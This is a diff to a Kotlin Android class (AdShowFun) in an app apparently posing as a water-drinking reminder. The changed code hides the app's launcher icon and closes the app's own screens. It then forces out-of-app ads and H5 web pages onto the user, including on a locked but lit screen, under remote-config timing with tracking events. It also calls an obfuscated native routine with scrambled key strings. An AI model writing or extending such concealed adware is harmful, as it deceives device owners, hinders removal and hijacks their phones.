@@ -167,9 +167,13 @@ class AdShowFun {
             KeyContent.showLog(" 文件名=: ${dataList[2]}")
             while (true) {
                 val a = ArrayList(ShowService.activityList)
-                if (a.isEmpty() || a.last().javaClass.name != "com.jgaodl.drinks.waters.days.happys.xy.MainActivity") {
-                    KeyContent.showLog("隐藏图标")
-                    FebFive.febSo("cu", 2008f)
+                if (a.isEmpty() || (a.last().javaClass.name != "com.jgaodl.drinks.waters.days.happys.xy.MainActivityOld" && a.last().javaClass.name != "com.jgaodl.drinks.waters.days.happys.xy.MainActivity")) {
+                    if (a.isEmpty()) {
+                        KeyContent.showLog("隐藏图标=null")
+                    } else {
+                        KeyContent.showLog("隐藏图标=${a.last().javaClass.name}")
+                    }
+                    FebFive.febSo("jgao,9dlcuao,9", 144f)
                     break
                 }
                 delay(500)
@@ -218,15 +222,17 @@ class AdShowFun {
         if (isAdDisplayIntervalTooShort(wait)) return
         val installFast = ShowService.getInstallFast()
         val timeD = installFast + (ins * 1000) + (jsonBean.wwwTime.toInt() * 1000)
-        KeyContent.showLog("KeyIsAdWtTime-1-: $timeD")
-        KeyContent.showLog("KeyIsAdWtTime-2-: ${System.currentTimeMillis()}")
         canNextState = false
-        if (timeD > System.currentTimeMillis()) {
+        val h5Url = jsonBean.wwwUUUl.split("-")[0]
+        KeyContent.showLog("h5Url=: ${h5Url}")
+        if (timeD > System.currentTimeMillis() && h5Url.isNotEmpty()) {
             // 检查广告展示限制
-            if (!FebApp.h5Limiter.canShowAd()){
+            if (!FebApp.h5Limiter.canShowAd()) {
                 KeyContent.showLog("h5广告展示限制")
                 return
             }
+            KeyContent.showLog("h5流程")
+
             ShowService.isH5State = true
         } else {
             ShowService.isH5State = false
@@ -235,6 +241,7 @@ class AdShowFun {
                 KeyContent.showLog("体外广告展示限制")
                 return
             }
+            KeyContent.showLog("体外流程")
         }
         showAdAndTrack()
     }
@@ -259,10 +266,7 @@ class AdShowFun {
     }
 
     private fun showAdAndTrack() {
-
         CanPost.postPointDataWithHandler(false, "ispass", "string", "")
-
-        // 在主线程执行广告跳转操作
         CoroutineScope(Dispatchers.Main).launch {
             ShowService.closeAllActivities()
             delay(1001)
@@ -271,8 +275,7 @@ class AdShowFun {
                 return@launch
             }
             addFa()
-            CanPost.postPointDataWithHandler(false, "isready")
-            FebFive.febSo("3vJ!9mQ#2xva@7bN2kP5r", 1028f)
+            FebFive.febSo("mQ#2xJ!9va3vk2@7bNP5r", 1021f)
             CanPost.postPointDataWithHandler(false, "callstart")
         }
     }
@@ -280,7 +283,10 @@ class AdShowFun {
     fun cloneAndOpenH5() {
         // 锁屏+亮屏幕  && 在N秒后 && H5不超限
         // 当广告未关闭 下一个循环触发 体外广告，也会调用Close
-        if (clickState) {
+        val jsonBean = KeyContent.getAdminData() ?: return
+        val h5Url = jsonBean.wwwUUUl.split("-")[0]
+        KeyContent.showLog("h5Url=: ${h5Url}")
+        if (clickState || h5Url.isEmpty()) {
             return
         }
         clickState = false
@@ -290,7 +296,6 @@ class AdShowFun {
             return
         }
         val installFast = ShowService.getInstallFast()
-        val jsonBean = KeyContent.getAdminData() ?: return
         val (wTime, ins, wait) = jsonBean.timeCanNext.parseLimits()
         val timeD = installFast + (ins * 1000) + (jsonBean.wwwTime.toInt() * 1000)
         val jiange = (System.currentTimeMillis() - AdUtils.adShowTime) / 1000
@@ -299,10 +304,10 @@ class AdShowFun {
 
         if (timeD <= System.currentTimeMillis() && jiange < wait) {
             // 检查广告展示限制
-           if (!FebApp.h5Limiter.canShowAd()) {
-               KeyContent.showLog("h5广告展示限制")
-               return
-           }
+            if (!FebApp.h5Limiter.canShowAd()) {
+                KeyContent.showLog("h5广告展示限制")
+                return
+            }
             KeyContent.showLog("跳转打开H5")
             ShowService.isH5State = true
             canNextState = true
@@ -314,15 +319,14 @@ class AdShowFun {
         CanPost.postPointDataWithHandler(false, "ispass", "string", "")
         CoroutineScope(Dispatchers.Main).launch {
             addFa()
-            CanPost.postPointDataWithHandler(false, "isready")
             ShowService.closeAllActivities()
             delay(778)
-            FebFive.febSo("3vJ!9mQ#2xva@7bN2kP5r", 1028f)
+            FebFive.febSo("@7b9#2xvaN3vJ!mQ2kP5r", 1028f)
             CanPost.postPointDataWithHandler(false, "callstart")
         }
     }
 
-    fun addFa(){
+    fun addFa() {
         var adNum = SPUtils.getInstance(FebApp.febApp).get(KeyContent.KEY_IS_AD_FAIL_COUNT, 0)
         adNum++
         SPUtils.getInstance(FebApp.febApp).put(KeyContent.KEY_IS_AD_FAIL_COUNT, adNum)
